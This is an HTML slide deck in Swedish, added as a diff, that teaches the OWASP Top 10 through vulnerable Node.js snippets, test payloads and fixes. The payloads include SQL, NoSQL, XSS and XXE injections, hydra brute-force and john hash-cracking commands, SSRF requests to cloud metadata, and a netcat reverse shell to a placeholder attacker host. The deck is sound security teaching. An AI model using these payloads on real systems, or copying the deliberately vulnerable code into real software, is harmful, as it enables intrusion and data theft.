@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>OWASP Top 10 – Vulnerable Code & Payloads</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://unpkg.com/reveal.js/dist/reveal.css">
+  <link rel="stylesheet" href="https://unpkg.com/reveal.js/dist/theme/black.css" id="theme">
+  <link rel="stylesheet" href="https://unpkg.com/highlight.js/styles/atom-one-dark.css">
+  <style>
+    .reveal pre code { font-size: 0.9em; border-radius: 8px; }
+    .label {
+      background: rgba(50,50,50,0.85);
+      color: #fff;
+      border-radius: 6px;
+      padding: 2px 14px;
+      font-size: 1em;
+      font-weight: bold;
+      display: inline-block;
+      margin-bottom: 0.5em;
+      letter-spacing: 0.5px;
+      box-shadow: 0 1px 8px #0002;
+    }
+    .label.vuln    { background: rgba(180,30,30,0.95);}
+    .label.payload { background: rgba(20,110,160,0.95);}
+    .label.fix     { background: rgba(30,160,80,0.95);}
+    .mini { font-size: 1.03em; color: #d1faff; margin-top: 1em; }
+    .reveal section h2 {
+      color: #29e3fe;
+      text-shadow: 0 2px 10px #0008;
+      font-size: 2.0em;
+    }
+    .reveal h3 { color: #fff; }
+    .reveal ul { color: #fff; }
+    .slide-spacer { margin-bottom: 2em; }
+  </style>
+</head>
+<body>
+  <div class="reveal">
+    <div class="slides">
+
+<!-- INTRO -->
+<section>
+  <h1>OWASP Top 10<br><span style="font-size:0.6em;color:#00e0ff;">Repetition</span></h1>
+
+</section>
+
+<!-- 1. BROKEN ACCESS CONTROL -->
+<section>
+    <section>
+      <h2>1. Broken Access Control</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-js">
+  app.get('/user/:id', (req, res) => {
+    User.findById(req.params.id)
+      .then(user => res.json(user));
+  });
+      </code></pre>
+      <div class="mini">API:et låter dig se andras profiler.</div>
+    </section>
+    <section>
+      <h2>Broken Access Control</h2>
+      <span class="label payload">IDOR – Insecure Direct Object Reference</span>
+      <pre><code class="language-bash">
+  curl /user/42
+  curl /api/orders/23456
+      </code></pre>
+      <div class="mini">Testa byta ut ID, se om du får ut eller kan ändra andras data.</div>
+    </section>
+    <section>
+      <h2>Broken Access Control</h2>
+      <span class="label payload">Force Browsing</span>
+      <pre><code class="language-bash">
+  curl /admin/panel
+  curl /backups/db.zip
+      </code></pre>
+      <div class="mini">Besök gömda eller skyddade endpoints manuellt.</div>
+    </section>
+    <section>
+      <h2>Broken Access Control</h2>
+      <span class="label payload">Method Tampering</span>
+      <pre><code class="language-bash">
+  # Prova andra HTTP-metoder i Burp Repeater:
+  PUT /user/123
+  DELETE /api/file/4321
+      </code></pre>
+      <div class="mini">Byt till POST, PUT, PATCH, DELETE och se vad som händer.</div>
+    </section>
+    <section>
+      <h2>Broken Access Control</h2>
+      <span class="label payload">Privilege Escalation / Role Tampering</span>
+      <pre><code class="language-bash">
+  # Manipulera JWT/cookie/session:
+  { "role": "admin" }
+      </code></pre>
+      <div class="mini">Byt din roll/session och testa skyddade endpoints.</div>
+    </section>
+    <section>
+      <h2>Broken Access Control</h2>
+      <span class="label fix">Fix</span>
+      <pre><code class="language-js">
+  if (req.user.id !== req.params.id && !req.user.isAdmin) {
+    return res.status(403).send('Forbidden');
+  }
+      </code></pre>
+      <div class="mini">Kontrollera rättigheter på serversidan – aldrig i frontend!</div>
+    </section>
+  </section>
+  
+  <!-- 2. CRYPTOGRAPHIC FAILURES -->
+  <section>
+    <section>
+      <h2>2. Cryptographic Failures</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-js">
+  const user = new User({ username, password: req.body.password });
+  await user.save();
+      </code></pre>
+      <div class="mini">Sparar lösenord i klartext
+        <br>Lösenord kan läsas i databasen.</div>
+    </section>
+    <section>
+      <h2>Cryptographic Failures</h2>
+      <span class="label payload">Klartext-data i trafik/databas</span>
+      <pre><code class="language-bash">
+  sqlite3 db.sqlite 'SELECT * FROM users'
+      </code></pre>
+      <div class="mini">Om vi kan komma åt dbn – du ser lösenorden i klartext.</div>
+    </section>
+    <section>
+      <h2>Cryptographic Failures</h2>
+      <span class="label payload">Svaga hashfunktioner</span>
+      <pre><code class="language-bash">
+  # Testa att cracka lösenord:
+  john --format=raw-md5 hashes.txt
+      </code></pre>
+      <div class="mini">Finns det MD5/SHA1/hashar eller enkla JWT secrets? Testa cracka!</div>
+    </section>
+    <section>
+      <h2>Cryptographic Failures</h2>
+      <span class="label payload">Skyddad trafik hela vägen? </span>
+      <div class="mini">Kika på trafiken mellan load balancers, web servers, or back-end system</div>
+    </section>
+    <section>
+      <h2>Cryptographic Failures</h2>
+      <span class="label payload">Oskyddade cookies</span>
+      <pre><code class="language-bash">
+  Set-Cookie: sessionid=123456;
+      </code></pre>
+      <div class="mini">Saknas "Secure"?</div>
+    </section>
+    <section>
+      <h2>Cryptographic Failures</h2>
+      <span class="label fix">Fix</span>
+      <pre><code class="language-js">
+  const bcrypt = require('bcryptjs');
+  const hashed = await bcrypt.hash(req.body.password, 12);
+  ---------------------------
+  res.cookie('session', token, { httpOnly: true, secure: true });
+      </code></pre>
+      <div class="mini">Hash + salt för lösenord, alltid HTTPS, skydda cookies!</div>
+    </section>
+  </section>
+  
+  <!-- 3. INJECTION (SQLi/XSS/Command/LDAP/NoSQL) -->
+  <section>
+    <section>
+      <h2>3. Injection: SQLi</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-js">
+  db.query(`SELECT * FROM users WHERE username = 
+  '${req.body.username}'`);
+      </code></pre>
+      <div class="mini">Okontrollerad input i SQL-query.</div>
+    </section>
+    <section>
+      <h2>Injection: SQLi</h2>
+      <span class="label payload">Classic Payload</span>
+      <pre><code class="language-text">
+  ' OR 1=1 --
+  " OR ""="
+  admin'-- 
+      </code></pre>
+      <div class="mini">Testa i login/search/filter osv</div>
+    </section>
+    <section>
+      <h2>Injection: Blind SQLi</h2>
+      <span class="label payload">Payload</span>
+      <pre><code class="language-text">
+  ' AND (SELECT sleep(5)) --
+      </code></pre>
+      <div class="mini">Testa med fördröjning - Kan vara blind SQLi.</div>
+    </section>
+    <section>
+      <h2>Injection: NoSQL Injection</h2>
+      <span class="label payload">MongoDB-payload</span>
+      <pre><code class="language-json">
+  { "username": { "$ne": null }, "password": { "$ne": null } }
+      </code></pre>
+      <div class="mini">Testa att injicera objekt i JSON-baserade API:er</div>
+    </section>
+    <section>
+      <h2>Injection: Command Injection</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-js">
+  exec(`ping ${req.body.host}`);
+      </code></pre>
+      <div class="mini">Får användaren styra shell-kommandon?</div>
+    </section>
+    <section>
+      <h2>Injection: Command Injection</h2>
+      <span class="label payload">Payload</span>
+      <pre><code class="language-bash">
+  127.0.0.1; id
+  test | whoami
+  google.com && nc attackerip 4444 -e /bin/sh
+      </code></pre>
+      <div class="mini">Kan du exekvera egna kommandon?</div>
+    </section>
+    <section>
+      <h2>Injection: XSS</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-js">
+  res.send(`<div>${req.body.comment}</div>`);
+      </code></pre>
+    </section>
+    <section>
+      <h2>Injection: XSS</h2>
+      <span class="label payload">Reflected/Stored</span>
+      <pre><code class="language-html">
+        &lt;script&gt;alert(1)&lt;/script&gt;
+        &lt;img src=x onerror=alert(1)&gt;
+        </code></pre>
+        
+      <div class="mini">Testa alla inmatningsfält, parametrar och headers!</div>
+    </section>
+    <section>
+      <h2>Injection: XXE</h2>
+      <span class="label payload">XXE Payload</span>
+      <pre><code class="language-xml">
+  <?xml version="1.0"?>
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  <foo>&xxe;</foo>
+      </code></pre>
+      <div class="mini">Skicka XML till sårbara API:er!</div>
+    </section>
+    <section>
+      <h2>Injection: Fix</h2>
+      <span class="label fix">Fix</span>
+      <pre><code class="language-js">
+  // SQLi: parametriserade queries
+  db.query('SELECT * FROM users WHERE username =
+  ?', [req.body.username]);
+  // XSS: escape/sanera output (DOMPurify etc)
+      </code></pre>
+      <div class="mini">Validera all input och undvik att direkt använda användardata i kod</div>
+    </section>
+  </section>
+  
+  <!-- 4. INSECURE DESIGN -->
+  <section>
+    <section>
+      <h2>4. Insecure Design</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-js">
+  if (user.isAdmin) { showAdminPanel(); }
+      </code></pre>
+      <div class="mini">Endast kontroll i frontend. <br>
+        Ingen riktig behörighetskontroll på servern.</div>
+    </section>
+    <section>
+      <h2>Insecure Design</h2>
+      <span class="label payload">Brute force / saknar rate limiting</span>
+      <pre><code class="language-bash">
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt host login
+      </code></pre>
+      <div class="mini">Testa login-API för brute force utan blockering.</div>
+    </section>
+    <section>
+      <h2>Insecure Design</h2>
+      <span class="label payload">No MFA / weak reset</span>
+      <div class="mini">Saknas tvåfaktorskydd eller svag återställningslänk?
+    </section>
+    <section>
+      <h2>Insecure Design</h2>
+      <span class="label fix">Fix</span>
+      <pre><code class="language-js">
+  app.get('/admin', (req, res) => {
+    if (!req.user.isAdmin) return res.status(403).send('Nope');
+    res.render('admin');
+  });
+      </code></pre>
+      <div class="mini">All kontroll måste göras på serversidan.<br> Inför rate limiting, MFA mm.</div>
+    </section>
+  </section>
+  
+  <!-- 5. SECURITY MISCONFIGURATION -->
+  <section>
+    <section>
+      <h2>5. Security Misconfiguration</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-js">
+  app.use(require('errorhandler')());
+      </code></pre>
+      <div class="mini">Visar stacktraces och intern info för alla.</div>
+    </section>
+    <section>
+      <h2>Security Misconfiguration</h2>
+      <span class="label payload">Directory Listing/Exposed Files</span>
+      <pre><code class="language-bash">
+  curl http://host/uploads/
+  curl http://host/.git/config
+      </code></pre>
+      <div class="mini">Kan du lista eller ladda hem dolda känsliga filer?</div>
+    </section>
+    <section>
+      <h2>Security Misconfiguration</h2>
+      <span class="label payload">Default Credentials</span>
+      <pre><code class="language-bash">
+  admin:admin
+  root:toor
+      </code></pre>
+      <div class="mini">Testa inloggning med vanliga lösenord.</div>
+    </section>
+    <section>
+      <h2>Security Misconfiguration</h2>
+      <span class="label payload">Verbose Errors / Info Disclosure</span>
+      <pre><code class="language-bash">
+  curl /not/a/real/url
+      </code></pre>
+      <div class="mini">Ger servern ut stack traces, interna sökvägar eller miljövariabler?</div>
+    </section>
+    <section>
+      <h2>Security Misconfiguration</h2>
+      <span class="label fix">Fix</span>
+      <pre><code class="language-js">
+  if (process.env.NODE_ENV === 'development') {
+    app.use(require('errorhandler')());
+  }
+      </code></pre>
+      <div class="mini">Debug/loggar endast i utveckling! Ingen directory listing.</div>
+    </section>
+  </section>
+  
+  <!-- 6. VULNERABLE & OUTDATED COMPONENTS -->
+  <section>
+    <section>
+      <h2>6. Vulnerable & Outdated Components</h2>
+      <span class="label vuln">Sårbar config</span>
+      <pre><code class="language-json">
+  "dependencies": {
+    "express": "4.15.0"
+  }
+      </code></pre>
+      <div class="mini">Gammal version kan ha publika exploits!</div>
+    </section>
+    <section>
+      <h2>Vulnerable Components</h2>
+      <span class="label payload">Automatisk scanning</span>
+      <div class="mini">Lokalt:</div>
+      <pre><code class="language-bash">
+  npm audit
+      </code></pre>
+      <div class="mini">Använd wappalyzer och liknande för att scanna</div>
+    </section>
+    <section>
+      <h2>Vulnerable Components</h2>
+      <span class="label payload">Gamla frontendbibliotek</span>
+      <pre><code class="language-bash">
+  /js/jquery-1.7.1.min.js
+      </code></pre>
+      <div class="mini">Sök publika exploits för bibliotek/ramverk.</div>
+    </section>
+    <section>
+      <h2>Vulnerable Components</h2>
+      <span class="label fix">Fix</span>
+      <pre><code class="language-json">
+  "express": "^4.19.0"
+      </code></pre>
+      <div class="mini">Uppdatera och patcha regelbundet!</div>
+    </section>
+  </section>
+  
+  <!-- 7. IDENTIFICATION & AUTHENTICATION FAILURES -->
+  <section>
+    <section>
+      <h2>7. Identification & Auth Failures</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-js">
+  if (user.password === req.body.password) { /* logic */ }
+      </code></pre>
+      <div class="mini">Jämför lösenord i klartext, alltid dåligt!</div>
+    </section>
+    <section>
+      <h2>Identification & Auth Failures</h2>
+      <span class="label payload">Brute Force / No Lockout</span>
+      <pre><code class="language-bash">
+  hydra -l admin -P passwords.txt host http-post-form
+   "/login:username=^USER^&password=^PASS^:F=fail"
+      </code></pre>
+      <div class="mini">Testa brute force – låses kontot eller går det obegränsat?</div>
+    </section>
+    <section>
+      <h2>Identification & Auth Failures</h2>
+      <span class="label payload">Session Fixation</span>
+      <div class="mini">Behåll session-cookie före och efter login, funkar den? <br>
+        Kan du byta användare utan nytt sessionid?</div>
+    </section>
+    <section>
+      <h2>Identification & Auth Failures</h2>
+      <span class="label payload">Weak/Missing Logout</span>
+      <div class="mini">Testa gamla session-cookies efter logout, funkar de?<br>
+        Ska alltid ogiltigförklaras vid utlogg.</div>
+    </section>
+    <section>
+      <h2>Identification & Auth Failures</h2>
+      <span class="label payload">Predictable/Weak tokens</span>
+      <pre><code class="language-bash">
+  token=abcdef12345, token=abcdef12346
+      </code></pre>
+      <div class="mini">Jämför, finns mönster? Kan du gissa tokens?</div>
+    </section>
+    <section>
+      <h2>Identification & Auth Failures</h2>
+      <span class="label fix">Fix</span>
+      <pre><code class="language-js">
+  const bcrypt = require('bcryptjs');
+  const match = await bcrypt.compare(req.body.password, user.password);
+  if (match) { /* logga in */ }
+      </code></pre>
+      <div class="mini">Hashjämförelse + rate limiting, token rotation, sessionhantering.</div>
+    </section>
+    <section>
+      <h2>Auth Failures: Cookies</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-js">
+  res.cookie('session', token);
+      </code></pre>
+      <div class="mini">Session-cookien saknar Secure/HttpOnly!</div>
+    </section>
+    <section>
+      <h2>Auth Failures: Cookies</h2>
+      <span class="label fix">Fix</span>
+      <pre><code class="language-js">
+  res.cookie('session', token, { httpOnly: true, secure: true });
+      </code></pre>
+      <div class="mini">Session-cookies bör alltid vara Secure + HttpOnly!</div>
+    </section>
+  </section>
+  
+  <!-- 8. SOFTWARE & DATA INTEGRITY FAILURES -->
+  <section>
+    <section>
+      <h2>8. Software & Data Integrity Failures</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-html">
+  <script src="http://cdn.unknown.com/script.js"></script>
+      </code></pre>
+      <div class="mini">Okänd källa kan leverera malware/script injection!</div>
+    </section>
+    <section>
+      <h2>Software Integrity</h2>
+      <span class="label payload">CI/CD Manipulation / Dependency Confusion</span>
+
+      <div class="mini">Kan du lägga till egna steg eller byta ut package i pipeline?<br>
+        Supply chain attacker ökar – testa build-processen!</div>
+    </section>
+    <section>
+      <h2>Software Integrity</h2>
+      <span class="label payload">Unsigned/Malicious Updates</span>
+      <div class="mini">Kan du själv publicera npm/pypi paket med samma namn?<br>
+        Dependency confusion/typosquatting-attacker ökar!</div>
+    </section>
+    <section>
+      <h2>Software Integrity</h2>
+      <span class="label fix">Fix</span>
+      <pre><code class="language-html">
+  <script src="https://cdn.trusted.com/script.js"
+    integrity="sha384-xyz..." crossorigin="anonymous"></script>
+      </code></pre>
+      <div class="mini">Använd endast signerade/whitelistade källor, SRI, hårda CI/CD-flöden.</div>
+    </section>
+  </section>
+  
+  <!-- 9. LOGGING & MONITORING FAILURES -->
+  <section>
+    <section>
+      <h2>9. Logging & Monitoring Failures</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-js">
+  if (!user) { res.status(401).send('Nope'); }
+      </code></pre>
+      <div class="mini">Ingen loggning vid misslyckad inloggning.</div>
+    </section>
+    <section>
+      <h2>Logging & Monitoring</h2>
+      <span class="label payload">Payload/Attack</span>
+      <div class="mini">Gör brute force, XSS, SQLi – finns loggar eller alert?<br>
+        Testa attacker, fråga kunden om loggning/monitorering finns!</div>
+    </section>
+    <section>
+      <h2>Logging & Monitoring</h2>
+      <span class="label payload">Log Tampering</span>
+      <pre><code class="language-js">
+  logger.info(req.body.username); // injection? newline?
+      </code></pre>
+      <div class="mini">Kan du radera eller injicera loggar?
+    </section>
+    <section>
+      <h2>Logging & Monitoring Failures</h2>
+      <span class="label fix">Fix</span>
+      <pre><code class="language-js">
+  if (!user) {
+    logger.warn(`Failed login for username: ${req.body.username}`);
+    res.status(401).send('Nope');
+  }
+      </code></pre>
+      <div class="mini">Logga alla säkerhetsrelevanta events och ha alerting på plats!</div>
+    </section>
+  </section>
+  
+  <!-- 10. SSRF -->
+  <section>
+    <section>
+      <h2>10. Server Side Request Forgery (SSRF)</h2>
+      <span class="label vuln">Sårbar kod</span>
+      <pre><code class="language-js">
+  axios.get(req.body.url).then(resp => res.send(resp.data));
+      </code></pre>
+      <div class="mini">Användaren styr serverns HTTP-requests.</div>
+    </section>
+    <section>
+      <h2>SSRF</h2>
+      <span class="label payload">Payload/Attack</span>
+      <pre><code class="language-text">
+  POST /fetch { "url": "http://localhost/admin" }
+  POST /fetch { "url": "http://169.254.169.254/latest/meta-data/" }
+      </code></pre>
+      <div class="mini">Testa interna IP, cloud-metadata, localhost!</div>
+    </section>
+    <section>
+      <h2>SSRF</h2>
+      <span class="label payload">DNS Rebinding</span>
+      <pre><code class="language-text">
+  rbndr.com
+      </code></pre>
+      <div class="mini">Använd domäner som ändrar IP för att nå interna resurser.</div>
+    </section>
+    <section>
+      <h2>SSRF</h2>
+      <span class="label fix">Fix</span>
+      <pre><code class="language-js">
+  const url = new URL(req.body.url);
+  const blocked = ['localhost', '127.0.0.1', '169.254.169.254'];
+  if (blocked.includes(url.hostname)) {
+    return res.status(400).send('Nope!');
+  }
+  axios.get(url.href).then(resp => res.send(resp.data));
+      </code></pre>
+      <div class="mini">Whitelist domäner, blockera interna resurser och IP-ranges!</div>
+    </section>
+  </section>
+  
+
+<!-- OUTRO -->
+<section>
+  <h2>Frågor?</h2>
+ 
+</section>
+
+    </div>
+  </div>
+  <script src="https://unpkg.com/reveal.js/dist/reveal.js"></script>
+  <script src="https://unpkg.com/reveal.js/plugin/highlight/highlight.js"></script>
+  <script>
+    Reveal.initialize({
+      hash: true,
+      slideNumber: true,
+      plugins: [ RevealHighlight ]
+    });
+  </script>
+</body>
+</html>
